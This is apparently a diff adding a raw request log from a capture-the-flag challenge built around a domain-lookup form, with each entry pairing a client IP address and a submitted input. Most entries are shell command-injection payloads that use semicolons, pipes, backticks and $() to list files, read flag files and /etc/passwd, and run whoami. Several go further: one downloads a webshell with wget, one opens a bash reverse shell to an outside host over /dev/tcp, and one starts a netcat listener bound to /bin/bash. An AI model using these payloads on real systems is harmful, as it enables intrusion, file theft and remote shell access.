@@ -1,0 +1,1086 @@
+207.237.184.68 -- ;cat flag
+207.237.184.68 -- google.com; cat 
+207.237.184.68 -- .c && cat fla
+207.237.184.68 -- `.c` && cat flag
+207.237.184.68 -- g.com
+207.237.184.68 -- 8.8.8.8
+207.237.184.68 -- j.com
+207.237.184.68 -- abc.xyz
+207.237.184.68 -- #cat flag
+207.237.184.68 -- `-
+207.237.184.68 -- `-`
+207.237.184.68 -- `-`;[]
+207.237.184.68 -- `-`[=
+207.237.184.68 -- %
+207.237.184.68 -- %.com
+70.171.32.108 -- google.com\03B'ls'
+
+
+70.171.32.108 -- google.com
+
+
+70.171.32.108 -- google.com
+
+
+70.171.32.108 -- google.com
+
+
+70.171.32.108 -- google.com
+
+
+70.171.32.108 -- google.com
+70.171.32.108 -- google.com;ls
+70.171.32.108 -- google.com^c;ls
+207.237.144.250 -- a.b.c.d
+207.237.144.250 -- a.b.c -d
+207.237.144.250 -- aaaa
+207.237.144.250 -- lol a.b.c.d
+207.237.144.250 -- 9.9
+207.237.144.250 -- j.j
+207.237.144.250 -- a j.j
+207.237.144.250 -- j.j.j.j
+207.237.144.250 -- .j.
+207.237.144.250 -- .j
+207.237.144.250 -- j.
+207.237.144.250 -- j.j `asdf`
+207.237.144.250 -- j.j $(asdf)
+207.237.144.250 -- j.j '`ls`'
+207.237.144.250 -- j.j '`pwd`'
+207.237.144.250 -- a.a'`ls|head -n1
+207.237.144.250 -- a.a'`ls|head -n1
+207.237.144.250 -- a.a'`ls|head -n1`'
+207.237.144.250 -- a.a'`ls|head -n1|tail -n1`'
+207.237.144.250 -- a.a'`ls|head -n2|tail -n1`'
+207.237.144.250 -- a.a'`ls|head -n3|tail -n1`'
+207.237.144.250 -- a.a'`ls|head -n4|tail -n1`'
+207.237.144.250 -- a.a'`ls|head -n5|tail -n1`'
+207.237.144.250 -- a.a'`ls|grep flag`'
+207.237.144.250 -- a.a'`cat index.php|grep flag`'
+207.237.144.250 -- a.a'`whoami`'
+207.237.144.250 -- a.a'`find /|grep flag`'
+207.237.144.250 -- a.a'`find /|grep flag >> /tmp/lol`'
+207.237.144.250 -- a.a'`cat /tmp/lol | head -n 1 | tail -n 1`'
+207.237.184.68 -- a.a
+207.237.184.68 -- a.a `cat`
+207.237.184.68 -- a.a `cat flag`
+207.237.184.68 -- a.a `cat`
+207.237.144.250 -- a.a'`ls | head -n 1`'
+207.237.144.250 -- a.a'`ls | head -n 2`'
+207.237.144.250 -- a.a'`ls | head -n 2 | tail -n 1`'
+207.237.144.250 -- a.a'`cat logs | head -n 2 | tail -n 1`'
+207.237.144.250 -- a.a'`cat logs | head -n 1 | tail -n 1`'
+207.237.144.250 -- a.a'`ls | head -n 3 | tail -n 1`'
+207.237.144.250 -- a.a'`ls | head -n 4 | tail -n 1`'
+207.237.144.250 -- a.a'`ls | head -n 5 | tail -n 1`'
+207.237.144.250 -- a.a'`cat logs | head -n 1`'
+207.237.184.68 -- `a.a `cat flag``
+207.237.144.250 -- a.a'`ls / | grep flag`'
+207.237.144.250 -- a.a'`ls / | grep flag`'
+207.237.144.250 -- a.a'`ls /tmp | `'
+207.237.144.250 -- a.a'`cat flag.txt`'
+207.237.144.250 -- a.a'`cat flag`'
+207.237.144.250 -- a.a'`ls /home`'
+207.237.144.250 -- a.a'`ls /home/dad `'
+207.237.144.250 -- a.a'`ls /home/dad`'
+207.237.144.250 -- a.a'`ls /home/`'
+207.237.144.250 -- a.a'`ls / | head -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 1 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 2 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 3 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 4 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 5 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 6 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 7 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 8 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 9 | tail -n 1`'
+207.237.144.250 -- a.a'`ls / | head -n 10 | tail -n 1`'
+207.237.144.250 -- a.a'`ls | head -n 10 | tail -n 1`'
+207.237.144.250 -- a.a'`cat logs | head -n 10 | tail -n 1`'
+207.237.144.250 -- a.a'`cat logs | head -n 1 | tail -n 1`'
+207.237.144.250 -- a.a'`pwd`'
+207.237.144.250 -- a.a'`ls ..`'
+207.237.144.250 -- a.a'`ls /root`'
+207.237.144.250 -- a.a'`ls /root | head -n 1 | tail -n1`'
+216.165.95.77 -- google.com `ls`
+216.165.95.77 -- g.co '`ls`'
+207.237.144.250 -- a.a'`ls | head -n 1 | tail -n1`'
+216.165.95.77 -- a.a '`whoami`'
+207.237.144.250 -- a.a'`ls | head -n 2 | tail -n1`'
+207.237.144.250 -- a.a'`ls | head -n 3 | tail -n1`'
+216.165.95.77 -- a '`cat /flag`'
+207.237.144.250 -- a.a'`ls /var/log/ | head -n 3 | tail -n1`'
+216.165.95.77 -- a '`cat /flag`'
+207.237.144.250 -- a.a'`ls /var/log/ | head -n ` | tail -n1`'
+207.237.144.250 -- a.a'`ls /var/log/ | head -n 1 | tail -n1`'
+207.237.144.250 -- a.a'`ls /var/log/ | head -n 2 | tail -n1`'
+207.237.144.250 -- a.a'`ls /var/log/apache2 | head -n 2 | tail -n1`'
+207.237.144.250 -- a.a'`ls /var/log/apache2 | head -n 1 | tail -n1`'
+216.165.95.77 -- a '`cat /flag`'
+216.165.95.77 -- a.a '`cat /flag`'
+216.165.95.77 -- a.a '`ls`'
+207.237.144.250 -- a.a'`nc -h`'
+207.237.144.250 -- a.a'`nc -h | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`nc --help | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`ls | tr -d '\n'`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n2 | tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n3 | tail -n1`'
+216.165.95.77 -- a.a '`ls logs | tr -d '\n'`'
+216.165.95.77 -- a.a '`ls logs/ | tr -d '\n'`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n3 | tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n4 | tail -n1`'
+216.165.95.77 -- a.a '`ls / | tr -d '\n'`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n5 | tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n6 | tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n67| tail -n1`'
+207.237.144.250 -- a.a'`cat /etc/passwd | head -n7 | tail -n1`'
+216.165.95.77 -- a.a '`ls / | tr -d '\n'`'
+207.237.144.250 -- a.a'`which wget | head -n7 | tail -n1`'
+207.237.144.250 -- a.a'`wget https://gist.githubusercontent.com/RyanKung/3369063/raw/c667793ae68db12b489030327fcc87618de8a7ba/webshell.php`'
+207.237.144.250 -- a.a'`ls | head -n7 | tail -n1`'
+207.237.144.250 -- a.a'`ls | head -n3 | tail -n1`'
+207.237.144.250 -- a.a'`ls | head -n2 | tail -n1`'
+207.237.144.250 -- a.a'`ls | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls -asl /home/dad | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls -asl /home/ | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`bash -i >& /dev/tcp/23.90.4.4/8888 0>&1`'
+207.237.144.250 -- a.a'`ls /home/ | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls -s /home/ | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls -a /home/ | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`ls`'
+207.237.144.250 -- a.a'`ls /home/ | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`ls /home`'
+207.237.144.250 -- a.a'`ls /home/dad | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls /home/dad | head -n2 | tail -n1`'
+216.165.95.77 -- a.a '`ls /home | tr -d '\n'`'
+216.165.95.77 -- a.a '`ls /home/dad | tr -d '\n'`'
+207.237.144.250 -- a.a'`ls /home/dad | head -n1 | tail -n1`'
+207.237.144.250 -- a.a'`ls / | head -n1 | tail -n1`'
+207.237.144.250 -- a.a '`ls / | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`find / -name \*flag\* | tr -d n`'
+216.165.95.77 -- a.a '`find / -name \*flag\* | tr -d '\n'`'
+207.237.144.250 -- a.a '`cd /; find . | grep flag | head -n1 | tail -n1`'
+216.165.95.77 -- a.a '`curl 23.90.4.4`'
+207.237.144.250 -- a.a '` cat .flag`'
+216.165.95.77 -- a.a '`ls`'
+216.165.95.77 -- a.a '`curl 23.90.4.4:8888`'
+70.171.32.108 -- google.com;ls
+70.171.32.108 -- google.com ;ls
+70.171.32.108 -- google.com' ;ls
+70.171.32.108 -- google.com||ls
+70.171.32.108 -- google.com || ls
+70.171.32.108 -- google.com\||\ls
+70.171.32.108 -- google.com || ls
+70.171.32.108 -- google.com; `ls`
+70.171.32.108 -- google.com || `ls`
+70.171.32.108 -- google.com\|\`ls`
+70.171.32.108 -- `ls`
+70.171.32.108 -- ($ls)
+70.171.32.108 -- $(ls)
+207.237.144.250 -- a.a && ls
+70.171.32.108 -- ($ls.)
+70.171.32.108 -- ($ls.d)
+70.171.32.108 -- (google.com)
+70.171.32.108 -- google.com()
+70.171.32.108 -- google.com||()
+70.171.32.108 -- google.com||($ls)
+70.171.32.108 -- google.com||`ls`
+70.171.32.108 -- google.com ||`ls`
+70.171.32.108 -- google.com\0||`ls`
+70.171.32.108 -- google.com;||`ls`
+70.171.32.108 -- google.com
+70.171.32.108 -- google.com"; cat /etc/hosts"
+70.171.32.108 -- google.com "; cat /etc/hosts"
+70.171.32.108 -- google.com || "; cat /etc/hosts"
+70.171.32.108 -- google.com 
+70.171.32.108 -- google.com\0 
+70.171.32.108 -- google.com\x00 
+70.171.32.108 -- google.com 
+70.171.32.108 -- google.com\
+70.171.32.108 -- google.com\
+70.171.32.108 -- google.com\
+70.171.32.108 -- google.com\
+70.171.32.108 -- google.com\
+70.171.32.108 -- `ls` 
+70.171.32.108 -- `ls ; google.com` 
+70.171.32.108 -- `google.com` 
+70.171.32.108 -- `ls` 
+70.171.32.108 -- ls
+70.171.32.108 -- ls.d
+70.171.32.108 -- `ls.d`
+70.171.32.108 -- \`ls.d\`
+70.171.32.108 -- \60ls\60
+70.171.32.108 -- \60ls;google.com\60
+70.171.32.108 -- \60google.com;ls\60
+70.171.32.108 -- google.com;\060ls\060
+70.171.32.108 -- google.com||\060ls\060
+70.171.32.108 -- google.com||\060ls\060
+70.171.32.108 -- google.com -i
+70.171.32.108 -- google.com' -i
+70.171.32.108 -- google.com" -i
+70.171.32.108 -- google.com -i
+70.171.32.108 -- google.com\-i
+70.171.32.108 -- google.com -i
+70.171.32.108 -- google.com\032-i
+70.171.32.108 -- google.com `;ls`
+70.171.32.108 -- google.com
+70.171.32.108 -- google.com;
+70.171.32.108 -- google.com'
+70.171.32.108 -- google.com"
+70.171.32.108 -- ``
+70.171.32.108 -- `google.com`
+70.171.32.108 -- a.s
+70.171.32.108 -- yahoo.com
+70.171.32.108 -- yahoo.com 
+70.171.32.108 -- yahoo.com\0
+70.171.32.108 -- yahoo.com\0ljlkj
+70.171.32.108 -- yahoo.com\m
+70.171.32.108 -- yahoo.com ls
+70.171.32.108 -- yahoo.com ls
+70.171.32.108 -- yahoo.com\ls
+70.171.32.108 -- yahoo.com\\ls
+70.171.32.108 -- yahoo.com\ls
+70.171.32.108 -- yahoo.com\\ls
+70.171.32.108 -- yahoo.com\\0ls
+70.171.32.108 -- yahoo.com+ls
+70.171.32.108 -- yahoo.com;ls
+70.171.32.108 -- yahoo.com||ls
+70.171.32.108 -- yahoo.com&&ls
+70.171.32.108 -- yahoo.com&ls
+70.171.32.108 -- yahoo.com&&ls
+70.171.32.108 -- yahoo.com"ls
+70.171.32.108 -- yahoo.com";ls"
+70.171.32.108 -- yahoo.com"&&ls"
+70.171.32.108 -- yahoo.com"||ls"
+70.171.32.108 -- yahoo.com""
+70.171.32.108 -- yahoo.com'
+70.171.32.108 -- yahoo.com`
+70.171.32.108 -- yahoo.com`;
+70.171.32.108 -- yahoo.com`||
+70.171.32.108 -- yahoo.com`||ls
+70.171.32.108 -- yahoo.com`||ls`
+70.171.32.108 -- yahoo.com||`ls`
+70.171.32.108 -- yahoo.com\000||`ls`
+70.171.32.108 -- yahoo.com&&`ls`
+70.171.32.108 -- yahoo.com
+70.171.32.108 -- yahoo.com
+70.171.32.108 -- yahoo.com
+70.171.32.108 -- yahoo.com
+70.171.32.108 -- yahoo.c m
+70.171.32.108 -- y.m
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com && ls
+104.162.97.95 -- ls
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com 
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com"
+104.162.97.95 -- google.com" 
+104.162.97.95 --   
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com'
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com 
+104.162.97.95 -- google.com'
+71.42.179.100 -- ';echo `ls`'
+71.42.179.100 -- ';echo `ls`'
+104.162.97.95 -- `echo google`.com
+71.42.179.100 -- google.com';echo `ls`'
+71.42.179.100 -- google.com';echo `ls -l`'
+104.162.97.95 -- ls
+104.162.97.95 -- ls.com
+71.42.179.100 -- google.com';echo `cat logs`'
+104.162.97.95 -- ls.com
+104.162.97.95 -- ls.com
+104.162.97.95 -- ls
+71.42.179.100 -- google.com';echo `ls`'
+104.162.97.95 -- ls
+104.162.97.95 -- "
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com && ls
+104.162.97.95 -- "google.com
+104.162.97.95 -- google.com" && l
+71.42.179.100 -- google.com';echo `cat index.php`'
+104.162.97.95 -- google.com" && l
+104.162.97.95 -- google.com"&&ls
+104.162.97.95 -- google.com";
+104.162.97.95 -- google.com""
+104.162.97.95 -- '
+71.42.179.100 -- google.com';echo `cat index.php`'
+104.162.97.95 -- '`echo google`'.com
+104.162.97.95 -- $(echo test).com
+104.162.97.95 -- test.com
+71.42.179.100 -- google.com';echo `ls`'
+71.42.179.100 -- google.com';echo `cat favicon.ico`'
+71.42.179.100 -- google.com';echo `which nc`'
+71.42.179.100 -- google.com';echo `which bash`'
+71.42.179.100 -- google.com';echo `nc -lp 6666 --exec /bin/bash`'
+104.162.97.95 -- "
+104.162.97.95 -- google.com
+104.162.97.95 -- google.com"
+71.42.179.100 -- google.com';echo `grep -r flag ./*`'
+71.42.179.100 -- google.com';echo `grep -rs flag /*`'
+104.162.97.95 -- all google.com
+129.21.26.212 -- yahoo.com
+70.171.32.108 -- -h
+70.171.32.108 -- g.d
+70.171.32.108 -- -g.g
+70.171.32.108 -- yahoo.com && ls
+104.162.97.95 -- $(echo google.com)
+104.162.97.95 -- `echo google.com
+104.162.97.95 -- `
+104.162.97.95 -- '
+104.162.97.95 -- ls
+71.42.179.100 -- google.com';ls'
+129.21.149.212 -- google.com
+129.21.149.212 -- google.com'; ls 
+104.162.97.95 -- google.com && echo hello
+129.21.149.212 -- google.com'; ls#
+129.21.149.212 -- google.com'; ls#
+71.42.179.100 -- google.com';ps -ef'
+71.42.179.100 -- google.com';ps -ef'
+71.42.179.100 -- google.com';cat /'
+71.42.179.100 -- google.com';ls /'
+71.42.179.100 -- google.com';nc --help'
+129.21.149.212 -- google.com
+129.21.149.212 -- google.com
+71.42.179.100 -- google.com';ls -a'
+129.21.149.212 -- google.com' ls
+129.21.149.212 -- google.com'|ls
+129.21.149.212 -- google.com"|ls
+129.21.149.212 -- google.com
+129.21.149.212 -- qwefjhdflaiusdfhkjsxcn.com
+71.42.179.100 -- google.com';cat .flag'
+129.21.149.212 -- `cat *`
+129.21.149.212 -- `cat flag`
+129.21.149.212 -- `ls|head`
+129.21.149.212 -- `whoami`.com
+129.21.149.212 -- $(echo google).com
+129.21.149.212 -- \$(echo google).com
+129.21.26.212 -- | ls
+73.210.164.108 -- google.com
+73.210.164.108 -- google.com
+73.210.164.108 -- google.com
+73.210.164.108 -- google.com
+73.210.164.108 -- google.com
+73.210.164.108 -- google.com/ls
+73.210.164.108 -- google.com;ls
+73.210.164.108 -- google.com;ls
+73.210.164.108 -- google.com
+104.162.97.95 -- SuperDuperSecret
+104.162.97.95 -- SuperDuperSecret
+104.162.97.95 -- $(ls).com
+104.162.97.95 -- ls.com
+104.162.97.95 -- $(echo ls).com
+104.162.97.95 -- ls.com
+150.156.212.108 -- hostname
+150.156.212.108 -- google.com
+104.162.97.95 -- *
+104.162.97.95 -- `echo ls`.com
+150.156.212.108 -- ls 
+104.162.97.95 -- '`echo ls`'.com
+150.156.210.42 -- google
+150.156.210.42 -- google.com
+150.156.210.42 -- no
+150.156.210.42 -- 8.8.8.8
+67.242.52.66 -- sfdkjn
+150.156.210.42 -- 127.0.0.1
+150.156.210.42 -- localhost
+150.156.210.42 -- localhost
+150.156.212.108 -- google.com
+150.156.210.42 -- '-V | ls
+150.156.210.42 -- google.com
+150.156.210.42 -- sunyit.edu
+67.242.52.66 -- %27| ls%27
+150.156.210.42 -- !
+67.242.52.66 -- webango.net
+150.156.212.108 -- test
+67.242.52.66 -- webango.net|ls
+67.242.52.66 -- webango.net|%24
+67.242.52.66 -- 127.0.0.1
+67.242.52.66 -- 8.8.8.8
+67.242.52.66 -- google.com
+67.242.52.66 -- google.com|ls
+67.242.52.66 -- google.com;ls
+67.242.52.66 -- google.com|
+67.242.52.66 -- google.com |
+150.156.189.1 -- \&| ls\&
+150.156.189.1 -- &|ls&
+150.156.189.1 -- ls
+150.156.189.1 -- \<
+150.156.189.1 -- /<|ls>
+67.242.52.66 -- ' google.com | '
+150.156.189.1 -- <img>
+150.156.210.42 -- !
+150.156.210.42 -- google.com
+67.242.52.66 -- " google.com | l
+150.156.189.1 -- google.com
+150.156.189.1 -- \027|ls\027
+150.156.189.1 -- \27|ls\27
+150.156.212.108 -- test
+150.156.189.1 -- google.com
+67.242.52.66 -- 047
+67.242.52.66 -- 47
+67.242.52.66 -- google.com 47
+67.242.52.66 -- google.com 047
+150.156.212.108 -- '| ls'
+150.156.212.108 -- test
+150.156.212.108 -- google.com
+150.156.189.1 -- %77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D
+67.242.52.66 -- \
+150.156.189.1 -- 0x42.0x0000066.0
+67.242.52.66 -- /
+150.156.189.1 -- google.com\277C6
+150.156.189.1 -- google.com\277C6
+150.156.189.1 -- \277C6C7327
+67.242.52.66 -- \047
+150.156.189.1 -- google.com\277C6C7327
+67.242.52.66 -- google.com \047
+150.156.189.1 -- \&#X000003c;
+150.156.212.108 -- \' ls \'
+67.242.52.66 -- \047google.com\047|
+74.79.56.87 -- | hi.l
+74.79.56.87 -- aa.aa | ls
+150.156.212.108 -- \'| ls \'
+74.79.56.87 -- {}
+74.79.56.87 -- aa.aa{}
+74.79.56.87 -- aa.aa`ls`
+74.79.56.87 -- `ping aa.aa`
+74.79.56.87 -- aa.aa `ls`
+74.79.56.87 -- aa.aa`ls`
+74.79.56.87 -- hi
+129.21.149.212 -- `cat flag`
+150.156.189.1 -- who
+129.21.149.212 -- `echo a`.com
+150.156.189.1 -- google
+150.156.189.1 -- *com
+150.156.189.1 -- *.com
+74.79.56.87 -- $PWD
+150.156.189.1 -- google.com
+74.79.56.87 -- aa.aa$PWD
+150.156.189.1 -- opendns.com
+150.156.189.1 -- bit.ly
+74.79.56.87 -- "ls
+74.79.56.87 -- aa.aa"ls
+74.79.56.87 -- aa.aa"; echo "hi
+74.79.56.87 -- aa.aa'; echo 'hi
+129.21.149.212 -- a.com
+74.79.56.87 -- aa.aa'; ls; echo 'hi
+129.21.149.212 -- `
+129.21.149.212 -- asdf
+129.21.149.212 -- asdf.com
+129.21.149.212 -- a.com
+129.21.149.212 -- a
+74.79.56.87 -- aa.aa'; ls logs; echo 'hi
+129.21.149.212 -- `echo a.com`
+150.156.212.108 -- test
+150.156.212.108 -- google.com
+74.79.56.87 -- aa.aa'; cat logs; echo 'hi
+74.79.56.87 -- aa.aa'; ls ../; echo 'hi
+74.79.56.87 -- '
+74.79.56.87 -- aa.aa'; ls ; echo 'hi
+74.79.56.87 -- aa.aa'; cat index.php ; echo 'hi
+67.242.52.66 -- 8.8.8.8
+67.242.52.66 -- dsfln.sdf
+67.242.52.66 -- sdafkjnsdflkjn'
+74.79.56.87 -- aa.aa'; ls; echo 'hi
+74.79.56.87 -- aa.aa'; pwd; echo 'hi
+74.79.56.87 -- aa.aa'; cat logs 2>&1; echo 'hi
+74.79.56.87 -- aa.aa'; ls -la; echo 'hi
+129.21.149.212 -- `echo greg.com`
+129.21.149.212 -- \$(echo google).com
+129.21.149.212 -- `echo google.com`
+129.21.149.212 -- google.com
+129.21.149.212 -- google
+129.21.149.212 -- google.com
+129.21.149.212 -- google.com|ls
+129.21.149.212 -- google.com\\
+129.21.149.212 -- google.com
+129.21.149.212 -- google.com | ls
+129.21.149.212 -- google.com 
+129.21.149.212 -- google.com; 
+129.21.149.212 -- google.com; 
+129.21.149.212 -- " 
+129.21.149.212 -- google.com" 
+129.21.149.212 -- google.com"
+129.21.149.212 -- google.com" 
+129.21.149.212 -- google.com 
+129.21.149.212 -- google.com    
+129.21.149.212 -- google.com
+129.21.149.212 -- ls 
+129.21.149.212 -- $(ls)google.com
+67.242.52.66 -- kdjfn
+67.242.52.66 -- sdfkjn.com
+129.21.149.212 -- $(echo google.com)
+129.21.149.212 -- $$(echo google.com)
+67.242.52.66 -- sdfkjn.com\047
+129.21.149.212 -- `echo google.com`
+129.21.149.212 -- `echo google.com
+129.21.149.212 -- google.com" | cat *
+129.21.149.212 -- google.com" | cat flag
+129.21.149.212 -- google.com" | cat * | base64
+129.21.149.212 -- google.com' | cat * | base64
+129.21.149.212 -- google.com' \| cat * \| base64
+67.242.52.66 -- sdfkjn.com %27
+67.242.52.66 -- %27 google.com | les%27
+67.242.52.66 -- %27 google.com %27
+67.242.52.66 -- %27google.com%27
+67.242.52.66 -- %27
+73.210.164.108 -- google.com
+78.0.208.145 -- a.b
+78.0.208.145 -- a.b
+78.0.208.145 -- a.b
+78.0.208.145 -- a.b'
+78.0.208.145 -- a.b
+78.0.208.145 -- a.b';ls;'
+78.0.208.145 -- a.b';cat logs;'
+78.0.208.145 -- a.b';cat index.php;'
+78.0.208.145 -- a.b';ls -al;'
+78.0.208.145 -- a.b';cat .flag;'
+70.171.32.108 -- ns.com
+70.171.32.108 -- google.com `;ls`
+70.171.32.108 -- 162.243.3
+70.171.32.108 -- n.c; ls
+70.171.32.108 -- n.c
+70.171.32.108 -- n.c 
+70.171.32.108 -- n.c%ls
+70.171.32.108 -- n.c ls
+70.171.32.108 -- n.c\x00ls
+70.171.32.108 -- n.c\\x00ls
+70.171.32.108 -- n.c\\00ls
+70.171.32.108 -- n.c\00ls
+70.171.32.108 -- n.c\00;ls
+70.171.32.108 -- -query=mx redhat
+70.171.32.108 -- redhat -query=mx
+70.171.32.108 -- r.c -query=mx 
+129.21.112.152 -- l
+129.21.112.152 -- ';';';';';';
+129.21.112.152 -- '''''
+129.21.112.152 -- %3B
+129.21.112.152 -- google.com
+129.21.112.152 -- %3BGoogle.com
+129.21.112.152 -- 'google.com
+129.21.112.152 -- google.com'
+129.21.112.152 -- google.com';
+129.21.112.152 -- ;'
+129.21.112.152 -- ;''';';';google.
+129.21.112.152 -- -
+129.21.112.152 -- ---google.com
+129.21.112.152 -- ###
+129.21.112.152 -- google.com#';
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com3
+129.21.112.152 -- 123.123.123.123
+129.21.112.152 -- 54545.com
+129.21.112.152 -- google.'com
+129.21.112.152 -- google.;com
+70.171.32.108 -- google.com `;ls`
+70.171.32.108 -- google.com
+70.171.32.108 -- google.com`%3bls
+70.171.32.108 -- t.a -query=mx 
+70.171.32.108 -- r.c -query=mx
+129.21.112.152 -- ';';';';'ls
+70.171.32.108 -- t.a' -query=mx
+70.171.32.108 -- t.a' -query=mx
+129.21.112.152 -- google.com
+70.171.32.108 -- 't.a' -query=mx
+70.171.32.108 -- t.a' -query=mx
+70.171.32.108 -- t.a($ls)
+70.171.32.108 -- t.a($ls)
+129.21.112.152 -- ;google.com
+70.171.32.108 -- t.a' ($ls)
+70.171.32.108 -- t.a||($ls)
+70.171.32.108 -- t.a&&($ls)
+70.171.32.108 -- yahoo.com&&($ls)
+129.21.112.152 -- 12121212121212121212.google.com
+70.171.32.108 -- yahoo.com
+
+&&($ls)
+70.171.32.108 -- yahoo.com&&;ls
+70.171.32.108 -- `ls`
+70.171.32.108 -- `ls.a || ls`
+129.21.112.152 -- gooooooooooooooogle.com';ls
+70.171.32.108 -- `google.com`
+129.21.112.152 -- ls                               google.com
+129.21.112.152 -- google.com                            ls
+70.171.32.108 -- google.com `;ls`
+129.21.112.152 -- google.com\168
+70.171.32.108 -- google.com `;ls`
+129.21.112.152 -- :
+70.171.32.108 -- /bin/ls
+129.21.112.152 -- ;google.com
+129.21.112.152 -- ^google.com
+129.21.112.152 -- %google.com
+129.21.112.152 -- ctf.rc3.club
+129.21.112.152 -- ...................ls
+129.21.112.152 -- a.b.c.d..............la
+129.21.112.152 -- google.com.............ls
+129.21.112.152 -- google.com              "ls"
+129.21.112.152 -- google.       co
+129.21.112.152 -- +++++++google.co
+129.21.112.152 -- ''''
+129.21.112.152 -- google.com
+129.21.112.152 -- 'google.com
+129.21.112.152 -- Z29vZ2xlLmNvbSc=
+129.21.112.152 -- \
+129.21.112.152 -- google.com
+129.21.112.152 -- \
+129.21.112.152 -- google.com\
+129.21.112.152 -- google.com\;
+129.21.112.152 -- google.com\ls
+129.21.112.152 -- ;
+129.21.112.152 -- google.com;
+129.21.112.152 -- google.com;ls#
+129.21.112.152 -- google.com;
+129.21.112.152 -- google.com;ls#
+129.21.112.152 -- google.com;ls\
+129.21.112.152 -- ;google.com\ls\
+129.21.112.152 -- google.com;ls#
+129.21.112.152 -- google.com
+129.21.112.152 -- ls;google.com
+129.21.112.152 -- google.com;;;;;;;;;;;;;;;;;ls
+129.21.112.152 -- google.com;ls;;;;;;;;;;;;;;;;ls
+129.21.112.152 -- google.com;ls;;;;;;;;;;;;;;;;ls'
+129.21.112.152 -- google.com;ls;;;;;;;;;;;;;;;;ls'ls
+129.21.112.152 -- google.com;ls/
+129.21.112.152 -- google.com;/ls
+129.21.112.152 -- ls;/ls
+129.21.112.152 -- google.com;ls/*
+129.21.112.152 -- google.com;ls;google.com
+129.21.112.152 -- google.com;ls;google.com\
+129.21.112.152 -- google.com;ls22
+129.21.112.152 -- google.com;ls22
+129.21.112.152 -- google.com;ls2
+129.21.112.152 -- google.com;ls9
+129.21.112.152 -- google\.com\;ls\9
+129.21.112.152 -- google.com\;ls\9
+129.21.112.152 -- ctf.google.com\;ls\9
+129.21.112.152 -- ctf.google.com
+129.21.112.152 -- .ctf.google.com
+129.21.112.152 -- http://www.google.com
+129.21.112.152 -- www.google.com
+129.21.112.152 -- ls;www.google.com
+129.21.112.152 -- ls;#www.google.com
+129.21.112.152 -- ls;\#www.google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com!
+129.21.112.152 -- google.com!ls
+129.21.112.152 -- google.com!;ls
+129.21.112.152 -- google.com!
+129.21.112.152 -- google.com9
+129.21.112.152 -- google.com99
+129.21.112.152 -- google.com%3
+129.21.112.152 -- google.com9
+129.21.112.152 -- google.comY
+129.21.112.152 -- google.com`
+129.21.112.152 -- google.coma
+129.21.112.152 -- google.comb
+129.21.112.152 -- google.comô
+129.21.112.152 -- google.comÄ
+129.21.112.152 -- google.comp
+129.21.112.152 -- google.comy
+129.21.112.152 -- google.comÄ
+129.21.112.152 -- google.com0
+129.21.112.152 -- google.com)
+129.21.112.152 -- google.com(
+129.21.112.152 -- google.com'
+129.21.112.152 -- google.com&
+129.21.112.152 -- google.com%
+129.21.112.152 -- google.com$
+129.21.112.152 -- google.com#
+129.21.112.152 -- google.com"
+129.21.112.152 -- google.com!
+129.21.112.152 -- google.com 
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com%;
+129.21.112.152 -- google.com$1
+129.21.112.152 -- google.com\;
+129.21.112.152 -- google.com\\;
+129.21.112.152 -- google.com\\;ls
+129.21.112.152 -- google.com\\;ls\
+129.21.112.152 -- 1
+129.21.112.152 -- 1.1
+129.21.112.152 -- 1.co
